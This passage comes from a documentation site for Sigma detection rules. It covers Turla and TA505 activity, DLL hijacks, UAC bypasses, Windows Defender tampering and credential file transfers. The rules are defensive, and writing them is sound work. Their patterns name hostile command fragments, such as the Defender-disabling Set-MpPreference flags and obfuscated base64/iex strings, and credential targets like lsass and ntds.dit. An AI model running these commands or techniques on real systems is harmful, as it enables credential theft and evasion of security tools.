in the destruction of, those systems.\nKnown false-positives Legitimate administrative activity References hhttps://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1529/T1529.md Raw rule (edit) title: \u0026#39;System Shutdown/Reboot\u0026#39; id: 40b1fbe2-18ea-4ee7-be47-0294285811de status: test description: \u0026#39;Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems.\u0026#39; author: \u0026#39;Igor Fits, Mikhail Larin, oscd.community\u0026#39; references: - hhttps://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1529/T1529.md date: 2020/10/19 modified: 2021/11/27 logsource: product: macos category: process_creation detection: selection: Image|endswith: - \u0026#39;/shutdown\u0026#39; - \u0026#39;/reboot\u0026#39; - \u0026#39;/halt\u0026#39; condition: selection falsepositives: - \u0026#39;Legitimate administrative activity\u0026#39; level: informational tags: - attack.impact - attack.t1529 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/macos/process_creation/proc_creation_macos_system_shutdown_reboot.yml/","tags":["attack.impact","attack.t1529"],"title":"System Shutdown/Reboot"},{"categories":null,"contents":"Detects a creation of systemd services which could be used by adversaries to execute malicious code.\nKnown false-positives Admin work like legit service installs. References https://attack.mitre.org/techniques/T1543/002/ https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.002/T1543.002.md Raw rule (edit) title: Systemd Service Creation id: 1bac86ba-41aa-4f62-9d6b-405eac99b485 status: experimental description: Detects a creation of systemd services which could be used by adversaries to execute malicious code. author: \u0026#39;Pawel Mazur\u0026#39; references: - https://attack.mitre.org/techniques/T1543/002/ - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.002/T1543.002.md date: 2022/02/03 modified: 2022/02/06 logsource: product: linux service: auditd detection: path: type: \u0026#39;PATH\u0026#39; nametype: \u0026#39;CREATE\u0026#39; name_1: name|startswith: - \u0026#39;/usr/lib/systemd/system/\u0026#39; - \u0026#39;/etc/systemd/system/\u0026#39; name_2: name|contains: - \u0026#39;/.config/systemd/user/\u0026#39; condition: path and 1 of name_* falsepositives: - Admin work like legit service installs. level: medium tags: - attack.persistence - attack.t1543.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_systemd_service_creation.yml/","tags":["attack.persistence","attack.t1543.002"],"title":"Systemd Service Creation"},{"categories":null,"contents":"Detects a threat actor creating a file named iertutil.dll in the C:\\Program Files\\Internet Explorer\\ directory over the network for a DCOM InternetExplorer DLL Hijack scenario.\nKnown false-positives Unknown References https://threathunterplaybook.com/notebooks/windows/08_lateral_movement/WIN-201009183000.html Raw rule (edit) title: T1021 DCOM InternetExplorer.Application Iertutil DLL Hijack id: c39f0c81-7348-4965-ab27-2fde35a1b641 status: test description: Detects a threat actor creating a file named `iertutil.dll` in the `C:\\Program Files\\Internet Explorer\\` directory over the network for a DCOM InternetExplorer DLL Hijack scenario. author: Roberto Rodriguez @Cyb3rWard0g, Open Threat Research (OTR) references: - https://threathunterplaybook.com/notebooks/windows/08_lateral_movement/WIN-201009183000.html date: 2020/10/12 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: 5145 RelativeTargetName|endswith: \u0026#39;\\Internet Explorer\\iertutil.dll\u0026#39; filter: SubjectUserName|endswith: \u0026#39;$\u0026#39; condition: selection and not filter falsepositives: - Unknown level: critical tags: - attack.lateral_movement - attack.t1021.002 - attack.t1021.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_dcom_iertutil_dll_hijack.yml/","tags":["attack.lateral_movement","attack.t1021.002","attack.t1021.003"],"title":"T1021 DCOM InternetExplorer.Application Iertutil DLL Hijack"},{"categories":null,"contents":"Detects a threat actor creating a file named iertutil.dll in the C:\\Program Files\\Internet Explorer\\ directory over the network and loading it for a DCOM InternetExplorer DLL Hijack scenario.\nKnown false-positives Unknown References https://threathunterplaybook.com/notebooks/windows/08_lateral_movement/WIN-201009183000.html Raw rule (edit) title: T1021 DCOM InternetExplorer.Application Iertutil DLL Hijack id: e554f142-5cf3-4e55-ace9-a1b59e0def65 description: Detects a threat actor creating a file named `iertutil.dll` in the `C:\\Program Files\\Internet Explorer\\` directory over the network and loading it for a DCOM InternetExplorer DLL Hijack scenario. status: experimental date: 2020/10/12 modified: 2021/06/27 author: Roberto Rodriguez @Cyb3rWard0g, Open Threat Research (OTR), wagga tags: - attack.lateral_movement - attack.t1021.002 - attack.t1021.003 references: - https://threathunterplaybook.com/notebooks/windows/08_lateral_movement/WIN-201009183000.html logsource: product: windows service: sysmon detection: selection_one: EventID: 11 Image: System TargetFilename|endswith: \u0026#39;\\Internet Explorer\\iertutil.dll\u0026#39; selection_two: EventID: 7 Image|endswith: \u0026#39;\\Internet Explorer\\iexplore.exe\u0026#39; ImageLoaded|endswith: \u0026#39;\\Internet Explorer\\iertutil.dll\u0026#39; condition: selection_one or selection_two falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/sysmon/sysmon_dcom_iertutil_dll_hijack.yml/","tags":["attack.lateral_movement","attack.t1021.002","attack.t1021.003"],"title":"T1021 DCOM InternetExplorer.Application Iertutil DLL Hijack"},{"categories":null,"contents":"Detects a threat actor creating a file named wbemcomn.dll in the C:\\Windows\\System32\\wbem\\ directory over the network for a WMI DLL Hijack scenario.\nKnown false-positives Unknown References https://threathunterplaybook.com/notebooks/windows/08_lateral_movement/WIN-201009173318.html Raw rule (edit) title: T1047 Wmiprvse Wbemcomn DLL Hijack id: f6c68d5f-e101-4b86-8c84-7d96851fd65c status: test description: Detects a threat actor creating a file named `wbemcomn.dll` in the `C:\\Windows\\System32\\wbem\\` directory over the network for a WMI DLL Hijack scenario. author: Roberto Rodriguez @Cyb3rWard0g, Open Threat Research (OTR) references: - https://threathunterplaybook.com/notebooks/windows/08_lateral_movement/WIN-201009173318.html date: 2020/10/12 modified: 2022/02/24 logsource: product: windows service: security detection: selection: Provider_Name: Microsoft-Windows-Security-Auditing EventID: 5145 RelativeTargetName|endswith: \u0026#39;\\wbem\\wbemcomn.dll\u0026#39; filter: SubjectUserName|endswith: \u0026#39;$\u0026#39; condition: selection and not filter falsepositives: - Unknown level: critical tags: - attack.execution - attack.t1047 - attack.lateral_movement - attack.t1021.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_wmiprvse_wbemcomn_dll_hijack.yml/","tags":["attack.execution","attack.t1047","attack.lateral_movement","attack.t1021.002"],"title":"T1047 Wmiprvse Wbemcomn DLL Hijack"},{"categories":null,"contents":"Detects execution of PowerShell\nKnown false-positives Unknown References https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190410151110.html Raw rule (edit) title: T1086 PowerShell Execution id: ac7102b4-9e1e-4802-9b4f-17c5524c015c status: test description: Detects execution of PowerShell author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190410151110.html date: 2019/09/12 modified: 2021/11/27 logsource: product: windows category: pipe_created detection: selection: PipeName|startswith: \u0026#39;\\PSHost\u0026#39; condition: selection falsepositives: - Unknown level: informational tags: - attack.execution - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/pipe_created/pipe_created_powershell_execution_pipe.yml/","tags":["attack.execution","attack.t1059.001"],"title":"T1086 PowerShell Execution"},{"categories":null,"contents":"Detects mshta loaded by wmiprvse as parent as used by TA505 malicious documents\nKnown false-positives unknown References https://twitter.com/ForensicITGuy/status/1334734244120309760 Raw rule (edit) title: TA505 Dropper Load Pattern id: 18cf6cf0-39b0-4c22-9593-e244bdc9a2d4 status: test description: Detects mshta loaded by wmiprvse as parent as used by TA505 malicious documents author: Florian Roth references: - https://twitter.com/ForensicITGuy/status/1334734244120309760 date: 2020/12/08 modified: 2022/01/07 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\mshta.exe\u0026#39; ParentImage|endswith: \u0026#39;\\wmiprvse.exe\u0026#39; condition: selection falsepositives: - unknown level: critical tags: - attack.execution - attack.g0092 - attack.t1106 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_apt_ta505_dropper.yml/","tags":["attack.execution","attack.g0092","attack.t1106"],"title":"TA505 Dropper Load Pattern"},{"categories":null,"contents":"Detects specific process characteristics of Chinese TAIDOOR RAT malware load\nKnown false-positives Unknown References https://us-cert.cisa.gov/ncas/analysis-reports/ar20-216a Raw rule (edit) title: TAIDOOR RAT DLL Load id: d1aa3382-abab-446f-96ea-4de52908210b status: test description: Detects specific process characteristics of Chinese TAIDOOR RAT malware load author: Florian Roth references: - https://us-cert.cisa.gov/ncas/analysis-reports/ar20-216a date: 2020/07/30 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: - \u0026#39;dll,MyStart\u0026#39; - \u0026#39;dll MyStart\u0026#39; selection2a: CommandLine|endswith: - \u0026#39; MyStart\u0026#39; selection2b: CommandLine|contains: - \u0026#39;rundll32.exe\u0026#39; condition: selection1 or ( selection2a and selection2b ) falsepositives: - Unknown level: critical tags: - attack.execution - attack.t1055.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_apt_taidoor.yml/","tags":["attack.execution","attack.t1055.001"],"title":"TAIDOOR RAT DLL Load"},{"categories":null,"contents":"Attempting to disable scheduled scanning and other parts of windows defender atp.\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md Raw rule (edit) title: Tamper Windows Defender id: ec19ebab-72dc-40e1-9728-4c0b805d722c description: Attempting to disable scheduled scanning and other parts of windows defender atp. status: experimental tags: - attack.defense_evasion - attack.t1562.001 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md author: frack113 date: 2021/06/07 modified: 2021/10/16 falsepositives: - Unknown level: high logsource: product: windows category: ps_classic_provider_start definition: fields have to be extract from event detection: tamper_ps_action: HostApplication|contains: \u0026#39;Set-MpPreference\u0026#39; tamper_ps_option: HostApplication|contains: - \u0026#39;-DisableRealtimeMonitoring 1\u0026#39; - \u0026#39;-DisableBehaviorMonitoring 1\u0026#39; - \u0026#39;-DisableScriptScanning 1\u0026#39; - \u0026#39;-DisableBlockAtFirstSeen 1\u0026#39; condition: tamper_ps_action and tamper_ps_option ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_classic/posh_pc_tamper_with_windows_defender.yml/","tags":["attack.defense_evasion","attack.t1562.001"],"title":"Tamper Windows Defender"},{"categories":null,"contents":"Detects suspicious requests to Telegram API without the usual Telegram User-Agent\nKnown false-positives Legitimate use of Telegram bots in the company References https://researchcenter.paloaltonetworks.com/2018/03/unit42-telerat-another-android-trojan-leveraging-telegrams-bot-api-to-target-iranian-users/ https://blog.malwarebytes.com/threat-analysis/2016/11/telecrypt-the-ransomware-abusing-telegram-api-defeated/ https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/ Raw rule (edit) title: Telegram API Access id: b494b165-6634-483d-8c47-2026a6c52372 status: test description: Detects suspicious requests to Telegram API without the usual Telegram User-Agent author: Florian Roth references: - https://researchcenter.paloaltonetworks.com/2018/03/unit42-telerat-another-android-trojan-leveraging-telegrams-bot-api-to-target-iranian-users/ - https://blog.malwarebytes.com/threat-analysis/2016/11/telecrypt-the-ransomware-abusing-telegram-api-defeated/ - https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/ date: 2018/06/05 modified: 2021/11/27 logsource: category: proxy detection: selection: r-dns: - \u0026#39;api.telegram.org\u0026#39; # Often used by Bots filter: c-useragent|contains: # Used https://core.telegram.org/bots/samples for this list - \u0026#39;Telegram\u0026#39; - \u0026#39;Bot\u0026#39; condition: selection and not filter fields: - ClientIP - c-uri - c-useragent falsepositives: - Legitimate use of Telegram bots in the company level: medium tags: - attack.defense_evasion - attack.command_and_control - attack.t1071.001 - attack.t1102.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/proxy/proxy_telegram_api.yml/","tags":["attack.defense_evasion","attack.command_and_control","attack.t1071.001","attack.t1102.002"],"title":"Telegram API Access"},{"categories":null,"contents":"Detects suspicious DNS queries to api.telegram.org used by Telegram Bots of any kind\nKnown false-positives Legitimate use of Telegram bots in the company References https://core.telegram.org/bots/faq https://researchcenter.paloaltonetworks.com/2018/03/unit42-telerat-another-android-trojan-leveraging-telegrams-bot-api-to-target-iranian-users/ https://blog.malwarebytes.com/threat-analysis/2016/11/telecrypt-the-ransomware-abusing-telegram-api-defeated/ https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/ Raw rule (edit) title: Telegram Bot API Request id: c64c5175-5189-431b-a55e-6d9882158251 status: experimental description: Detects suspicious DNS queries to api.telegram.org used by Telegram Bots of any kind author: Florian Roth date: 2018/06/05 modified: 2021/08/09 references: - https://core.telegram.org/bots/faq - https://researchcenter.paloaltonetworks.com/2018/03/unit42-telerat-another-android-trojan-leveraging-telegrams-bot-api-to-target-iranian-users/ - https://blog.malwarebytes.com/threat-analysis/2016/11/telecrypt-the-ransomware-abusing-telegram-api-defeated/ - https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/ logsource: category: dns detection: selection: query: \u0026#39;api.telegram.org\u0026#39; # Telegram Bot API Request https://core.telegram.org/bots/faq condition: selection falsepositives: - Legitimate use of Telegram bots in the company level: medium tags: - attack.command_and_control - attack.t1102.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/net_susp_telegram_api.yml/","tags":["attack.command_and_control","attack.t1102.002"],"title":"Telegram Bot API Request"},{"categories":null,"contents":"Detects usage of Time Travel Debugging Utility. Adversaries can execute malicious processes and dump processes, such as lsass.exe, via tttracer.exe.\nKnown false-positives Legitimate usage by software developers/testers References https://lolbas-project.github.io/lolbas/Binaries/Tttracer/ https://twitter.com/mattifestation/status/1196390321783025666 https://twitter.com/oulusoyum/status/1191329746069655553 Raw rule (edit) title: Time Travel Debugging Utility Usage id: e76c8240-d68f-4773-8880-5c6f63595aaf status: experimental description: Detects usage of Time Travel Debugging Utility. Adversaries can execute malicious processes and dump processes, such as lsass.exe, via tttracer.exe. references: - https://lolbas-project.github.io/lolbas/Binaries/Tttracer/ - https://twitter.com/mattifestation/status/1196390321783025666 - https://twitter.com/oulusoyum/status/1191329746069655553 author: \u0026#39;Ensar Şamil, @sblmsrsn, @oscd_initiative\u0026#39; date: 2020/10/06 modified: 2021/09/21 tags: - attack.defense_evasion - attack.credential_access - attack.t1218 - attack.t1003.001 logsource: product: windows category: image_load detection: selection: ImageLoaded|endswith: - \u0026#39;\\ttdrecord.dll\u0026#39; - \u0026#39;\\ttdwriter.dll\u0026#39; - \u0026#39;\\ttdloader.dll\u0026#39; condition: selection falsepositives: - Legitimate usage by software developers/testers level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/image_load/image_load_tttracer_mod_load.yml/","tags":["attack.defense_evasion","attack.credential_access","attack.t1218","attack.t1003.001"],"title":"Time Travel Debugging Utility Usage"},{"categories":null,"contents":"Transferring files with well-known filenames (sensitive files with credential data) using network shares\nKnown false-positives Transferring sensitive files for legitimate administration work by legitimate administrator References https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment Raw rule (edit) title: Transferring Files with Credential Data via Network Shares id: 910ab938-668b-401b-b08c-b596e80fdca5 status: test description: Transferring files with well-known filenames (sensitive files with credential data) using network shares author: Teymur Kheirkhabarov, oscd.community references: - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment date: 2019/10/22 modified: 2021/11/30 logsource: product: windows service: security detection: selection: Provider_Name: Microsoft-Windows-Security-Auditing EventID: 5145 RelativeTargetName|contains: - \u0026#39;\\mimidrv\u0026#39; - \u0026#39;\\lsass\u0026#39; - \u0026#39;\\windows\\minidump\\\u0026#39; - \u0026#39;\\hiberfil\u0026#39; - \u0026#39;\\sqldmpr\u0026#39; - \u0026#39;\\sam\u0026#39; - \u0026#39;\\ntds.dit\u0026#39; - \u0026#39;\\security\u0026#39; condition: selection falsepositives: - Transferring sensitive files for legitimate administration work by legitimate administrator level: medium tags: - attack.credential_access - attack.t1003.002 - attack.t1003.001 - attack.t1003.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_transferring_files_with_credential_data_via_network_shares.yml/","tags":["attack.credential_access","attack.t1003.002","attack.t1003.001","attack.t1003.003"],"title":"Transferring Files with Credential Data via Network Shares"},{"categories":null,"contents":"Transferring files with well-known filenames (sensitive files with credential data) using network shares\nKnown false-positives Transferring sensitive files for legitimate administration work by legitimate administrator References https://github.com/neo23x0/sigma/blob/373424f14574facf9e261d5c822345a282b91479/rules/windows/builtin/win_transferring_files_with_credential_data_via_network_shares.yml Raw rule (edit) title: Transferring Files with Credential Data via Network Shares - Zeek id: 2e69f167-47b5-4ae7-a390-47764529eff5 status: test description: Transferring files with well-known filenames (sensitive files with credential data) using network shares author: \u0026#39;@neu5ron, Teymur Kheirkhabarov, oscd.community\u0026#39; references: - https://github.com/neo23x0/sigma/blob/373424f14574facf9e261d5c822345a282b91479/rules/windows/builtin/win_transferring_files_with_credential_data_via_network_shares.yml date: 2020/04/02 modified: 2021/11/27 logsource: product: zeek service: smb_files detection: selection: name: - \u0026#39;\\mimidrv\u0026#39; - \u0026#39;\\lsass\u0026#39; - \u0026#39;\\windows\\minidump\\\u0026#39; - \u0026#39;\\hiberfil\u0026#39; - \u0026#39;\\sqldmpr\u0026#39; - \u0026#39;\\sam\u0026#39; - \u0026#39;\\ntds.dit\u0026#39; - \u0026#39;\\security\u0026#39; condition: selection falsepositives: - Transferring sensitive files for legitimate administration work by legitimate administrator level: medium tags: - attack.credential_access - attack.t1003.002 - attack.t1003.001 - attack.t1003.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/zeek/zeek_smb_converted_win_transferring_files_with_credential_data.yml/","tags":["attack.credential_access","attack.t1003.002","attack.t1003.001","attack.t1003.003"],"title":"Transferring Files with Credential Data via Network Shares - Zeek"},{"categories":null,"contents":"Detects TropicTrooper activity, an actor who targeted high-profile organizations in the energy and food and beverage sectors in Asia\nReferences https://cloudblogs.microsoft.com/microsoftsecure/2018/11/28/windows-defender-atp-device-risk-score-exposes-new-cyberattack-drives-conditional-access-to-protect-networks/ Raw rule (edit) title: TropicTrooper Campaign November 2018 id: 8c7090c3-e0a0-4944-bd08-08c3a0cecf79 author: \u0026#39;@41thexplorer, Microsoft Defender ATP\u0026#39; status: stable date: 2019/11/12 modified: 2020/08/27 description: Detects TropicTrooper activity, an actor who targeted high-profile organizations in the energy and food and beverage sectors in Asia references: - https://cloudblogs.microsoft.com/microsoftsecure/2018/11/28/windows-defender-atp-device-risk-score-exposes-new-cyberattack-drives-conditional-access-to-protect-networks/ tags: - attack.execution - attack.t1059.001 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: \u0026#39;abCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCc\u0026#39; condition: selection level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_apt_tropictrooper.yml/","tags":["attack.execution","attack.t1059.001"],"title":"TropicTrooper Campaign November 2018"},{"categories":null,"contents":"Detects Turla ComRAT patterns\nKnown false-positives Unknown References https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf Raw rule (edit) title: Turla ComRAT id: 7857f021-007f-4928-8b2c-7aedbe64bb82 status: test description: Detects Turla ComRAT patterns author: Florian Roth references: - https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf date: 2020/05/26 modified: 2021/11/27 logsource: category: proxy detection: selection: c-uri|contains: \u0026#39;/index/index.php?h=\u0026#39; condition: selection falsepositives: - Unknown level: critical tags: - attack.defense_evasion - attack.command_and_control - attack.t1071.001 - attack.g0010 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/proxy/proxy_turla_comrat.yml/","tags":["attack.defense_evasion","attack.command_and_control","attack.t1071.001","attack.g0010"],"title":"Turla ComRAT"},{"categories":null,"contents":"Detects commands used by Turla group as reported by ESET in May 2020\nKnown false-positives Unknown References https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf Raw rule (edit) title: Turla Group Commands May 2020 id: 9e2e51c5-c699-4794-ba5a-29f5da40ac0c status: test description: Detects commands used by Turla group as reported by ESET in May 2020 author: Florian Roth references: - https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf date: 2020/05/26 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: - \u0026#39;tracert -h 10 yahoo.com\u0026#39; - \u0026#39;.WSqmCons))|iex;\u0026#39; - \u0026#39;Fr`omBa`se6`4Str`ing\u0026#39; selection2: CommandLine|contains|all: - \u0026#39;net use https://docs.live.net\u0026#39; - \u0026#39;@aol.co.uk\u0026#39; condition: 1 of selection* falsepositives: - Unknown level: critical tags: - attack.g0010 - attack.execution - attack.t1059.001 - attack.t1053.005 - attack.t1027 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_apt_turla_comrat_may20.yml/","tags":["attack.g0010","attack.execution","attack.t1059.001","attack.t1053.005","attack.t1027"],"title":"Turla Group Commands May 2020"},{"categories":null,"contents":"Detects automated lateral movement by Turla group\nKnown false-positives Unknown References https://securelist.com/the-epic-turla-operation/65545/ Raw rule (edit) title: Turla Group Lateral Movement id: c601f20d-570a-4cde-a7d6-e17f99cb8e7f status: experimental description: Detects automated lateral movement by Turla group references: - https://securelist.com/the-epic-turla-operation/65545/ tags: - attack.g0010 - attack.execution - attack.t1059 - attack.lateral_movement - attack.t1021.002 - attack.discovery - attack.t1083 - attack.t1135 author: Markus Neis date: 2017/11/07 modified: 2021/09/19 logsource: category: process_creation product: windows detection: selection: CommandLine: - \u0026#39;net use \\\\%DomainController%\\C$ \u0026#34;P@ssw0rd\u0026#34; *\u0026#39; - \u0026#39;dir c:\\\\*.doc* /s\u0026#39; - \u0026#39;dir %TEMP%\\\\*.exe\u0026#39; condition: selection level: critical falsepositives: - Unknown ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_apt_turla_commands_critical.yml/","tags":["attack.g0010","attack.execution","attack.t1059","attack.lateral_movement","attack.t1021.002","attack.discovery","attack.t1083","attack.t1135"],"title":"Turla Group Lateral Movement"},{"categories":null,"contents":"Detects a named pipe used by Turla group samples\nKnown false-positives Unknown References Internal Research https://attack.mitre.org/groups/G0010/ Raw rule (edit) title: Turla Group Named Pipes id: 739915e4-1e70-4778-8b8a-17db02f66db1 status: test description: Detects a named pipe used by Turla group samples author: Markus Neis references: - Internal Research - https://attack.mitre.org/groups/G0010/ date: 2017/11/06 modified: 2021/11/27 logsource: product: windows category: pipe_created definition: \u0026#39;Note that you have to configure logging for Named Pipe Events in Sysmon config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon configuration (https://github.com/SwiftOnSecurity/sysmon-config), but it is worth verifying. You can also use other repo, e.g. https://github.com/Neo23x0/sysmon-config, https://github.com/olafhartong/sysmon-modular. How to test detection? You can check powershell script from this site https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575\u0026#39; detection: selection: PipeName: - \u0026#39;\\atctl\u0026#39; # https://www.virustotal.com/#/file/a4ddb2664a6c87a1d3c5da5a5a32a5df9a0b0c8f2e951811bd1ec1d44d42ccf1/detection - \u0026#39;\\userpipe\u0026#39; # ruag apt case - \u0026#39;\\iehelper\u0026#39; # ruag apt case - \u0026#39;\\sdlrpc\u0026#39; # project cobra https://www.gdatasoftware.com/blog/2015/01/23926-analysis-of-project-cobra - \u0026#39;\\comnap\u0026#39; # https://www.gdatasoftware.com/blog/2015/01/23926-analysis-of-project-cobra # - \u0026#39;\\rpc\u0026#39; # may cause too many false positives : http://kb.palisade.com/index.php?pg=kb.page\u0026amp;id=483 condition: selection falsepositives: - Unknown level: critical tags: - attack.g0010 - attack.execution - attack.t1106 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/pipe_created/pipe_created_apt_turla_namedpipes.yml/","tags":["attack.g0010","attack.execution","attack.t1106"],"title":"Turla Group Named Pipes"},{"categories":null,"contents":"Unfixed method for UAC bypass from windows 10. WSReset.exe file associated with the Windows Store. It will run a binary file contained in a low-privilege registry.\nKnown false-positives unknown References https://www.bleepingcomputer.com/news/security/trickbot-uses-a-new-windows-10-uac-bypass-to-launch-quietly https://lolbas-project.github.io/lolbas/Binaries/Wsreset Raw rule (edit) title: UAC Bypass Via Wsreset id: 6ea3bf32-9680-422d-9f50-e90716b12a66 status: test description: Unfixed method for UAC bypass from windows 10. WSReset.exe file associated with the Windows Store. It will run a binary file contained in a low-privilege registry. author: oscd.community, Dmitry Uchakin references: - https://www.bleepingcomputer.com/news/security/trickbot-uses-a-new-windows-10-uac-bypass-to-launch-quietly - https://lolbas-project.github.io/lolbas/Binaries/Wsreset date: 2020/10/07 modified: 2021/11/27 logsource: category: registry_event product: windows detection: selection: TargetObject|endswith: - \u0026#39;\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command\u0026#39; condition: selection fields: - ComputerName - Image - EventType - TargetObject falsepositives: - unknown level: high tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_bypass_via_wsreset.yml/","tags":["attack.defense_evasion","attack.privilege_escalation","attack.t1548.002"],"title":"UAC Bypass Via Wsreset"},{"categories":null,"contents":"Attempts to load dismcore.dll after dropping it\nKnown false-positives Pentests Actions of a legitimate telnet client References https://steemit.com/utopian-io/@ah101/uac-bypassing-utility Raw rule (edit) title: UAC Bypass With Fake DLL id: a5ea83a7-05a5-44c1-be2e-addccbbd8c03 status: experimental description: Attempts to load dismcore.dll after dropping it references: - https://steemit.com/utopian-io/@ah101/uac-bypassing-utility tags: - attack.persistence - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 - attack.t1574.002 author: oscd.community, Dmitry Uchakin date: 2020/10/06 modified: 2021/11/23 logsource: category: image_load product: windows detection: selection: Image|endswith: - \u0026#39;\\dism.exe\u0026#39; ImageLoaded|endswith: - \u0026#39;\\dismcore.dll\u0026#39; filter: ImageLoaded: - \u0026#39;C:\\Windows\\System32\\Dism\\dismcore.dll\u0026#39; condition: selection and not filter falsepositives: - Pentests - Actions of a legitimate telnet client level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/image_load/image_load_uac_bypass_via_dism.yml/","tags":["attack.persistence","attack.defense_evasion","attack.privilege_escalation","attack.t1548.002","attack.t1574.002"],"title":"UAC Bypass With Fake DLL"},{"categories":null,"contents":"Detect scenarios where a potentially unauthorized application or user is modifying the system time.\nKnown false-positives HyperV or other virtualization technologies with binary not listed in filter portion of detection References Private Cuckoo Sandbox (from many years ago, no longer have hash, NDA as well) Live environment caused by malware https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4616 Raw rule (edit) title: Unauthorized System Time Modification id: faa031b5-21ed-4e02-8881-2591f98d82ed status: test description: Detect scenarios where a potentially unauthorized application or user is modifying the system time. author: \u0026#39;@neu5ron\u0026#39; references: - Private Cuckoo Sandbox (from many years ago, no longer have hash, NDA as well) - Live environment caused by malware - https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4616 date: 2019/02/05 modified: 2021/11/27 logsource: product: windows service: security definition: \u0026#39;Requirements: Audit Policy : System \u0026gt; Audit Security State Change, Group Policy : Computer Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\System\\Audit Security State Change\u0026#39; detection: selection: EventID: 4616 filter1: ProcessName: - \u0026#39;C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe\u0026#39; - \u0026#39;C:\\Windows\\System32\\VBoxService.exe\u0026#39; filter2: ProcessName: \u0026#39;C:\\Windows\\System32\\svchost.exe\u0026#39; SubjectUserSid: \u0026#39;S-1-5-19\u0026#39; condition: selection and not 1 of filter* falsepositives: - HyperV or other virtualization technologies with binary not listed in filter portion of detection level: medium tags: - attack.defense_evasion - attack.t1070.006 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_susp_time_modification.yml/","tags":["attack.defense_evasion","attack.t1070.006"],"title":"Unauthorized System Time Modification"},{"categories":null,"contents":"Detects a specific PowerShell command line pattern used by the UNC2452 actors as mentioned in Microsoft and Symantec reports\nKnown false-positives Unknown, unlikely, but possible References https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/solarwinds-raindrop-malware https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/ https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1047/T1047.md#atomic-test-7---create-a-process-using-wmi-query-and-an-encoded-command Raw rule (edit) title: UNC2452 PowerShell Pattern id: b7155193-8a81-4d8f-805d-88de864ca50c description: Detects a specific PowerShell command line pattern used by the UNC2452 actors as mentioned in Microsoft and Symantec reports status: experimental references: - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/solarwinds-raindrop-malware - https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/ - 